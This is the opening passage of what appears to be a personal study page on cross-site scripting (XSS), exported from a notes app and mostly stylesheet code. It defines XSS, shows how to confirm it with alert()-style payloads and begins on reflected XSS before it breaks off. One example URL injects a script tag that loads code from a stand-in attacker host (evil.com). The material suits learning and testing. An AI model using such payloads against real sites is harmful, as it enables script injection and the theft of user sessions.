<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>

<link href='https://fonts.loli.net/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext' rel='stylesheet' type='text/css' /><style type='text/css'>html {overflow-x: initial !important;}:root { --bg-color:#ffffff; --text-color:#333333; --select-text-bg-color:#B5D6FC; --select-text-font-color:auto; --monospace:"Lucida Console",Consolas,"Courier",monospace; --title-bar-height:20px; }
.mac-os-11 { --title-bar-height:28px; }
html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; tab-size: 4; }
iframe { margin: auto; }
a.url { word-break: break-all; }
a:active, a:hover { outline: 0px; }
.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
#write.first-line-indent p { text-indent: 2em; }
#write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; }
#write.first-line-indent li { margin-left: 2em; }
.for-image #write { padding-left: 8px; padding-right: 8px; }
body.typora-export { padding-left: 30px; padding-right: 30px; }
.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
.typora-export .task-list-item input { pointer-events: none; }
@media screen and (max-width: 500px) {
  body.typora-export { padding-left: 0px; padding-right: 0px; }
  #write { padding-left: 20px; padding-right: 20px; }
  .CodeMirror-sizer { margin-left: 0px !important; }
  .CodeMirror-gutters { display: none !important; }
}
#write li > figure:last-child { margin-bottom: 0.5rem; }
#write ol, #write ul { position: relative; }
img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
button, input, select, textarea { color: inherit; font: inherit; }
input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
*, ::after, ::before { box-sizing: border-box; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }
#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }
p { line-height: inherit; }
h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
p { orphans: 4; }
h1 { font-size: 2rem; }
h2 { font-size: 1.8rem; }
h3 { font-size: 1.6rem; }
h4 { font-size: 1.4rem; }
h5 { font-size: 1.2rem; }
h6 { font-size: 1rem; }
.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
.hidden { display: none; }
.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
a { cursor: pointer; }
sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
figure > table { margin: 0px; }
tr { break-inside: avoid; break-after: auto; }
thead { display: table-header-group; }
table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
table.md-table td { min-width: 32px; }
.CodeMirror-gutters { border-right: 0px; background-color: inherit; }
.CodeMirror-linenumber { user-select: none; }
.CodeMirror { text-align: left; }
.CodeMirror-placeholder { opacity: 0.3; }
.CodeMirror pre { padding: 0px 4px; }
.CodeMirror-lines { padding: 0px; }
div.hr:focus { cursor: none; }
#write pre { white-space: pre-wrap; }
#write.fences-no-line-wrapping pre { white-space: pre; }
#write pre.ty-contain-cm { white-space: normal; }
.CodeMirror-gutters { margin-right: 4px; }
.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
#write .md-fences.mock-cm { white-space: pre-wrap; }
.md-fences.md-fences-with-lineno { padding-left: 0px; }
#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
.CodeMirror-line, twitterwidget { break-inside: avoid; }
.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
.footnotes + .footnotes { margin-top: 0px; }
.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
li div { padding-top: 0px; }
blockquote { margin: 1rem 0px; }
li .mathjax-block, li p { margin: 0.5rem 0px; }
li blockquote { margin: 1rem 0px; }
li { margin: 0px; position: relative; }
blockquote > :last-child { margin-bottom: 0px; }
blockquote > :first-child, li > :first-child { margin-top: 0px; }
.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
#write .footnote-line { white-space: pre-wrap; }
@media print {
  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
  #write { margin-top: 0px; padding-top: 0px; border-color: transparent !important; }
  .typora-export * { -webkit-print-color-adjust: exact; }
  .typora-export #write { break-after: avoid; }
  .typora-export #write::after { height: 0px; }
  .is-mac table { break-inside: avoid; }
  .typora-export-show-outline .typora-export-sidebar { display: none; }
}
.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
a img, img a { cursor: pointer; }
pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
p > .md-image:only-child { display: inline-block; width: 100%; }
#write .MathJax_Display { margin: 0.8em 0px 0px; }
.md-math-block { width: 100%; }
.md-math-block:not(:empty)::after { display: none; }
.MathJax_ref { fill: currentcolor; }
[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
.md-task-list-item { position: relative; list-style-type: none; }
.task-list-item.md-task-list-item { padding-left: 0px; }
.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }
.math { font-size: 1rem; }
.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
.md-toc-content { position: relative; margin-left: 0px; }
.md-toc-content::after, .md-toc::after { display: none; }
.md-toc-item { display: block; color: rgb(65, 131, 196); }
.md-toc-item a { text-decoration: none; }
.md-toc-inner:hover { text-decoration: underline; }
.md-toc-inner { display: inline-block; cursor: pointer; }
.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
.md-toc-h2 .md-toc-inner { margin-left: 2em; }
.md-toc-h3 .md-toc-inner { margin-left: 4em; }
.md-toc-h4 .md-toc-inner { margin-left: 6em; }
.md-toc-h5 .md-toc-inner { margin-left: 8em; }
.md-toc-h6 .md-toc-inner { margin-left: 10em; }
@media screen and (max-width: 48em) {
  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
}
a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
.footnote-line a:not(.reversefootnote) { color: inherit; }
.md-attr { display: none; }
.md-fn-count::after { content: "."; }
code, pre, samp, tt { font-family: var(--monospace); }
kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
code { text-align: left; vertical-align: initial; }
a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
.md-diagram-panel > svg { max-width: 100%; }
[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
[lang="mermaid"] .node text { font-size: 1rem; }
table tr th { border-bottom: 0px; }
video { max-width: 100%; display: block; margin: 0px auto; }
iframe { max-width: 100%; width: 100%; border: none; }
.highlight td, .highlight tr { border: 0px; }
mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
.md-expand mark .md-meta { opacity: 0.3 !important; }
mark .md-meta { color: rgb(0, 0, 0); }
@media print {
  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
}
.md-diagram-panel .messageText { stroke: none !important; }
.md-diagram-panel .start-state { fill: var(--node-fill); }
.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
.md-fences.md-fences-math { font-size: 1em; }
.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
.md-fences-advanced:not(.md-focus) { background: inherit; }
.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
.typora-export-show-outline #write { --webkit-flex:2; flex: 2 1 0%; }
.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
@media screen and (max-width: 1024px) {
  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
}
@media screen and (max-width: 800px) {
  .typora-export-sidebar { display: none; }
}
.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; }
.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
.outline-content strong { font-weight: 400; }
.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
.outline-expander:hover::before { content: ""; }
.outline-h1 > .outline-item { padding-left: 0px; }
.outline-h2 > .outline-item { padding-left: 1em; }
.outline-h3 > .outline-item { padding-left: 2em; }
.outline-h4 > .outline-item { padding-left: 3em; }
.outline-h5 > .outline-item { padding-left: 4em; }
.outline-h6 > .outline-item { padding-left: 5em; }
.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
.outline-label:hover { text-decoration: underline; }
.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }
.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
.outline-children { display: none; }
.info-panel-tab-wrapper { display: none; }
.outline-item-open > .outline-children { display: block; }
.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }
.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
.typora-export-collapse-outline .outline-children { display: none; }
.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
.md-inline-math-container mjx-container { zoom: 0.95; }


.CodeMirror { height: auto; }
.CodeMirror.cm-s-inner { background: inherit; }
.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }
.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }
.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
.cm-negative { color: rgb(221, 68, 68); }
.cm-positive { color: rgb(34, 153, 34); }
.cm-header, .cm-strong { font-weight: 700; }
.cm-del { text-decoration: line-through; }
.cm-em { font-style: italic; }
.cm-link { text-decoration: underline; }
.cm-error { color: red; }
.cm-invalidchar { color: red; }
.cm-constant { color: rgb(38, 139, 210); }
.cm-defined { color: rgb(181, 137, 0); }
div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
.CodeMirror { position: relative; overflow: hidden; }
.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
.CodeMirror-sizer { position: relative; }
.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }
.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }
.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }
.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }
.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
.CodeMirror-lines { cursor: text; }
.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }
.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }
.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }
.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }
.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
.CodeMirror-measure pre { position: static; }
.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }
.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
.cm-searching { background: rgba(255, 255, 0, 0.4); }
span.cm-underlined { text-decoration: underline; }
span.cm-strikethrough { text-decoration: line-through; }
.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }
.cm-tw-deleted { text-decoration: line-through; }
.cm-tw-header5 { font-weight: 700; }
.cm-tw-listitem:first-child { padding-left: 10px; }
.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }
.cm-tw-underline { text-decoration: underline; }
@media print {
  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
}


:root {
    --side-bar-bg-color: #fafafa;
    --control-text-color: #777;
}

@include-when-export url(https://fonts.loli.net/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext);

/* open-sans-regular - latin-ext_latin */
  /* open-sans-italic - latin-ext_latin */
    /* open-sans-700 - latin-ext_latin */
    /* open-sans-700italic - latin-ext_latin */
  html {
    font-size: 16px;
    -webkit-font-smoothing: antialiased;
}

body {
    font-family: "Open Sans","Clear Sans", "Helvetica Neue", Helvetica, Arial, 'Segoe UI Emoji', sans-serif;
    color: rgb(51, 51, 51);
    line-height: 1.6;
}

#write {
    max-width: 860px;
  	margin: 0 auto;
  	padding: 30px;
    padding-bottom: 100px;
}

@media only screen and (min-width: 1400px) {
	#write {
		max-width: 1024px;
	}
}

@media only screen and (min-width: 1800px) {
	#write {
		max-width: 1200px;
	}
}

#write > ul:first-child,
#write > ol:first-child{
    margin-top: 30px;
}

a {
    color: #4183C4;
}
h1,
h2,
h3,
h4,
h5,
h6 {
    position: relative;
    margin-top: 1rem;
    margin-bottom: 1rem;
    font-weight: bold;
    line-height: 1.4;
    cursor: text;
}
h1:hover a.anchor,
h2:hover a.anchor,
h3:hover a.anchor,
h4:hover a.anchor,
h5:hover a.anchor,
h6:hover a.anchor {
    text-decoration: none;
}
h1 tt,
h1 code {
    font-size: inherit;
}
h2 tt,
h2 code {
    font-size: inherit;
}
h3 tt,
h3 code {
    font-size: inherit;
}
h4 tt,
h4 code {
    font-size: inherit;
}
h5 tt,
h5 code {
    font-size: inherit;
}
h6 tt,
h6 code {
    font-size: inherit;
}
h1 {
    font-size: 2.25em;
    line-height: 1.2;
    border-bottom: 1px solid #eee;
}
h2 {
    font-size: 1.75em;
    line-height: 1.225;
    border-bottom: 1px solid #eee;
}

/*@media print {
    .typora-export h1,
    .typora-export h2 {
        border-bottom: none;
        padding-bottom: initial;
    }

    .typora-export h1::after,
    .typora-export h2::after {
        content: "";
        display: block;
        height: 100px;
        margin-top: -96px;
        border-top: 1px solid #eee;
    }
}*/

h3 {
    font-size: 1.5em;
    line-height: 1.43;
}
h4 {
    font-size: 1.25em;
}
h5 {
    font-size: 1em;
}
h6 {
   font-size: 1em;
    color: #777;
}
p,
blockquote,
ul,
ol,
dl,
table{
    margin: 0.8em 0;
}
li>ol,
li>ul {
    margin: 0 0;
}
hr {
    height: 2px;
    padding: 0;
    margin: 16px 0;
    background-color: #e7e7e7;
    border: 0 none;
    overflow: hidden;
    box-sizing: content-box;
}

li p.first {
    display: inline-block;
}
ul,
ol {
    padding-left: 30px;
}
ul:first-child,
ol:first-child {
    margin-top: 0;
}
ul:last-child,
ol:last-child {
    margin-bottom: 0;
}
blockquote {
    border-left: 4px solid #dfe2e5;
    padding: 0 15px;
    color: #777777;
}
blockquote blockquote {
    padding-right: 0;
}
table {
    padding: 0;
    word-break: initial;
}
table tr {
    border: 1px solid #dfe2e5;
    margin: 0;
    padding: 0;
}
table tr:nth-child(2n),
thead {
    background-color: #f8f8f8;
}
table th {
    font-weight: bold;
    border: 1px solid #dfe2e5;
    border-bottom: 0;
    margin: 0;
    padding: 6px 13px;
}
table td {
    border: 1px solid #dfe2e5;
    margin: 0;
    padding: 6px 13px;
}
table th:first-child,
table td:first-child {
    margin-top: 0;
}
table th:last-child,
table td:last-child {
    margin-bottom: 0;
}

.CodeMirror-lines {
    padding-left: 4px;
}

.code-tooltip {
    box-shadow: 0 1px 1px 0 rgba(0,28,36,.3);
    border-top: 1px solid #eef2f2;
}

.md-fences,
code,
tt {
    border: 1px solid #e7eaed;
    background-color: #f8f8f8;
    border-radius: 3px;
    padding: 0;
    padding: 2px 4px 0px 4px;
    font-size: 0.9em;
}

code {
    background-color: #f3f4f4;
    padding: 0 2px 0 2px;
}

.md-fences {
    margin-bottom: 15px;
    margin-top: 15px;
    padding-top: 8px;
    padding-bottom: 6px;
}


.md-task-list-item > input {
  margin-left: -1.3em;
}

@media print {
    html {
        font-size: 13px;
    }
    table,
    pre {
        page-break-inside: avoid;
    }
    pre {
        word-wrap: break-word;
    }
}

.md-fences {
	background-color: #f8f8f8;
}
#write pre.md-meta-block {
	padding: 1rem;
    font-size: 85%;
    line-height: 1.45;
    background-color: #f7f7f7;
    border: 0;
    border-radius: 3px;
    color: #777777;
    margin-top: 0 !important;
}

.mathjax-block>.code-tooltip {
	bottom: .375rem;
}

.md-mathjax-midline {
    background: #fafafa;
}

#write>h3.md-focus:before{
	left: -1.5625rem;
	top: .375rem;
}
#write>h4.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
#write>h5.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
#write>h6.md-focus:before{
	left: -1.5625rem;
	top: .285714286rem;
}
.md-image>.md-meta {
    /*border: 1px solid #ddd;*/
    border-radius: 3px;
    padding: 2px 0px 0px 4px;
    font-size: 0.9em;
    color: inherit;
}

.md-tag {
    color: #a7a7a7;
    opacity: 1;
}

.md-toc { 
    margin-top:20px;
    padding-bottom:20px;
}

.sidebar-tabs {
    border-bottom: none;
}

#typora-quick-open {
    border: 1px solid #ddd;
    background-color: #f8f8f8;
}

#typora-quick-open-item {
    background-color: #FAFAFA;
    border-color: #FEFEFE #e5e5e5 #e5e5e5 #eee;
    border-style: solid;
    border-width: 1px;
}

/** focus mode */
.on-focus-mode blockquote {
    border-left-color: rgba(85, 85, 85, 0.12);
}

header, .context-menu, .megamenu-content, footer{
    font-family: "Segoe UI", "Arial", sans-serif;
}

.file-node-content:hover .file-node-icon,
.file-node-content:hover .file-node-open-state{
    visibility: visible;
}

.mac-seamless-mode #typora-sidebar {
    background-color: #fafafa;
    background-color: var(--side-bar-bg-color);
}

.md-lang {
    color: #b4654d;
}

/*.html-for-mac {
    --item-hover-bg-color: #E6F0FE;
}*/

#md-notification .btn {
    border: 0;
}

.dropdown-menu .divider {
    border-color: #e5e5e5;
    opacity: 0.4;
}

.ty-preferences .window-content {
    background-color: #fafafa;
}

.ty-preferences .nav-group-item.active {
    color: white;
    background: #999;
}

.menu-item-container a.menu-style-btn {
    background-color: #f5f8fa;
    background-image: linear-gradient( 180deg , hsla(0, 0%, 100%, 0.8), hsla(0, 0%, 100%, 0)); 
}



</style><title>xss</title>
</head>
<body class='typora-export os-windows'><div class='typora-export-content'>
<div id='write'  class=''><h1>Cross-Site Scripting (XSS) Overview </h1><p><a href='index.html'><span>Home</span></a></p><p>❎💲💲</p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n5"><a class="md-toc-inner" href="#what-is-xss">What is XSS</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n14"><a class="md-toc-inner" href="#confirm-xss">Confirm XSS</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n24"><a class="md-toc-inner" href="#three-types-of-xss">Three Types of XSS</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n27"><a class="md-toc-inner" href="#reflected-xss">Reflected XSS</a></span><span role="listitem" class="md-toc-item md-toc-h5" data-ref="n38"><a class="md-toc-inner" href="#find-and-test-1">Find and Test</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n60"><a class="md-toc-inner" href="#stored-xss">Stored XSS</a></span><span role="listitem" class="md-toc-item md-toc-h5" data-ref="n76"><a class="md-toc-inner" href="#find-and-test-2">Find and Test</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n93"><a class="md-toc-inner" href="#dom-based-xss">DOM-based XSS</a></span><span role="listitem" class="md-toc-item md-toc-h5" data-ref="n292"><a class="md-toc-inner" href="#find-and-test-3">Find and Test</a></span><span role="listitem" class="md-toc-item md-toc-h5" data-ref="n298"><a class="md-toc-inner" href="#exploiting-dom-with-different-sources-and-sinks">Exploiting DOM with different sources and Sinks</a></span><span role="listitem" class="md-toc-item md-toc-h5" data-ref="n304"><a class="md-toc-inner" href="#sources-and-sinks-in-third-party-dependencies">Sources and sinks in third-party dependencies</a></span><span role="listitem" class="md-toc-item md-toc-h6" data-ref="n142"><a class="md-toc-inner" href="#dom-xss-in-jquery">DOM XSS in JQuery</a></span><span role="listitem" class="md-toc-item md-toc-h5" data-ref="n168"><a class="md-toc-inner" href="#dom-xss-combined-with-reflected-and-stored-data">DOM XSS combined with reflected and stored data</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n176"><a class="md-toc-inner" href="#ways-of-exploiting-xss">Ways of Exploiting XSS</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n180"><a class="md-toc-inner" href="#stealing-cookies">Stealing Cookies</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n193"><a class="md-toc-inner" href="#capture-passwords">Capture Passwords</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n197"><a class="md-toc-inner" href="#xss-to-perform-csrf">XSS to perform CSRF</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n202"><a class="md-toc-inner" href="#what-can-xss-be-used-for">What can XSS be used for</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n219"><a class="md-toc-inner" href="#how-to-find-and-test-for-xss-vulnerabilities">How to find and test for XSS vulnerabilities</a></span><span role="listitem" class="md-toc-item md-toc-h4" data-ref="n311"><a class="md-toc-inner" href="#context">Context</a></span><span role="listitem" class="md-toc-item md-toc-h3" data-ref="n261"><a class="md-toc-inner" href="#prevent-xss-attacks">Prevent XSS attacks</a></span></p></div><h3 id='what-is-xss'><span>What is XSS</span></h3><p>⬛️◽️◼️</p><p><span>A web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. Allows attackers to circumvent the same origin policy, which is designed to segregate different websites from each other.</span></p><p><span>XSS vulnerabilities normally allow attackers to masquerade as a victim user, to carry out any actions that that user is able to perform.</span></p><p><span>XSS works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. Happens because user input is not sanitized.</span></p><p><span>The attacker would include malicious JavaScript within the vulnerable URL/app</span></p><p><strong><span>Attacker --&gt;</span></strong><span> </span><a href='https://unsecure-website/comment?input=' target='_blank' class='url'>https://unsecure-website/comment?input=</a><font color=red><script src=https://evil.com/bad.js></script></font></p><hr /><p>&nbsp;</p><h3 id='confirm-xss'><span>Confirm XSS</span></h3><p>⬛️◽️◼️</p><p><span>You may confirm most kinds of XSS by injecting a payload that causes your own browser to execute some JavaScript. Most common practice is to use the </span><font color=blue><span>alert()</span></font><span> function (short and harmless). </span></p><p><code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></p><p><code>alert(document.domain)</code><span> and </span><code>alert(window.origin)</code><span> will tell you where the code is exectuted unlike alert(&#39;test&#39;)</span></p><p><font color=purple><span>Note - </span></font><span>Recent versions of Chrome (v.92 and later) disabled the alert for cross-domain iframes for the </span><font color=blue><span>alert()</span></font><span> function, instead it is recommended to use the </span><font color=blue><span>print()</span></font><span> or </span><font color=blue><span>confirm()</span></font><span> function.</span></p><p><span>Portswigger XSS CheatSheet: </span><a href='https://portswigger.net/web-security/cross-site-scripting/cheat-sheet' target='_blank' class='url'>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p><p><span>WIth so many different types of XSS, the location of the data within the applications response determines what type of payload is required to exploit it. If the application perform any validation, it will affect what kind of XSS payload is needed.</span></p><hr /><p>&nbsp;</p><h3 id='three-types-of-xss'><span>Three Types of XSS</span></h3><p>⬛️◽️◼️</p><p><a href='xss.html'><span>Top</span></a></p><h4 id='reflected-xss'><span>Reflected XSS</span></h4><p><span>where the malicious script comes from the current GET HTTP request.</span></p><p><span>The simplest variety of XSS. when an application receives data in an HTTP request and includes that data within the immediate response. </span></p><hr /><p><span>Suppose a website has a search function that receives user 